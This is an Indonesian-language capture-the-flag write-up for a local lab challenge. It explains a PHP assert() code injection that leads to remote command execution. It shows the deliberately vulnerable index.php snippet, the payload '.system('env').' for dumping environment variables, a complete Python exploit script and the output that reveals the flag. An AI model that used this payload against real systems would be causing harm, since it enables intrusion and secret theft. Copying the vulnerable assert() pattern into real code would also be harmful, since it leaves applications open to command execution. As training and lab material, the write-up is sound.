# WriteUp: Rahasia Mega

## Overview

* **Judul:** Rahasia Mega
* **Kategori:** Input Injection
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Mega?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex4.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Mega]
└─$ tree
.
├── codex4.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex4.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex4:latest
    ports:
      - "1337:8080"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Mega]
└─$ PWN=WanZKey docker compose -f codex4.yml up -d --build
[+] up 16/16
 ✔ Image ghcr.io/hengkerrusia/codex4:latest Pulled
 ✔ Network rahasiamega_default Created
 ✔ Container rahasiamega-web-1 Created

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi file `index.php` di dalam container. Ditemukan penggunaan fungsi berbahaya `assert()` pada validasi input.

**Snippet Vulnerable (`index.php`):**

```php
$input = isset($_GET['data']) ? $_GET['data'] : '';

if (!empty($input)) {
    // 1. Input user dimasukkan ke dalam string query
    $check = "strpos('$input', 'malicious') === false";

    // 2. VULNERABILITY: assert() mengevaluasi string sebagai kode PHP
    if (assert($check)) {
        // ...
    }
}

```

**Analisis Kerentanan:**

1. **Vulnerable Function:** PHP `assert()`. Pada konfigurasi tertentu (atau PHP versi lama), jika `assert()` menerima parameter berupa string, ia akan mengeksekusinya layaknya `eval()`.
2. **Injection Logic:** Developer menyusun string `$check` dengan membungkus `$input` menggunakan single quote (`'`).
3. **Exploit Strategy:** Penyerang dapat menutup single quote pembuka (`'`), menyisipkan fungsi eksekusi perintah (RCE) seperti `system()`, lalu menyambung kembali string sisa agar valid secara sintaksis.
* Target Code: `strpos('INPUT', ...)`
* Payload: `'.system('env').'`
* Result Code: `strpos(''.system('env').'', ...)`



### 3. Exploitation

Mengirimkan payload RCE melalui parameter GET `data` untuk mendump Environment Variable (flag).

## Script Solver

Script Python untuk melakukan eksploitasi otomatis.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1337)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload PHP Assert Injection
    # Menggunakan konkatenasi (.) untuk menyisipkan system('env')
    # Payload: '.system('env').'
    payload = "'.system('env').'"
    
    print(f"[*] Sending Payload: {payload}")
    
    try:
        # Kirim GET request ke parameter 'data'
        r = requests.get(URL, params={'data': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Regex Flag pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed.")
                print(r.text[:500]) 
        else:
            print(f"[-] Error Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Mega]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Sending Payload: '.system('env').'
[+] Injection Successful!

[!!!] FLAG FOUND: pwn{82f6ab6595c99853c92aad970552c984}

```

## Flag

```
pwn{82f6ab6595c99853c92aad970552c984}

```
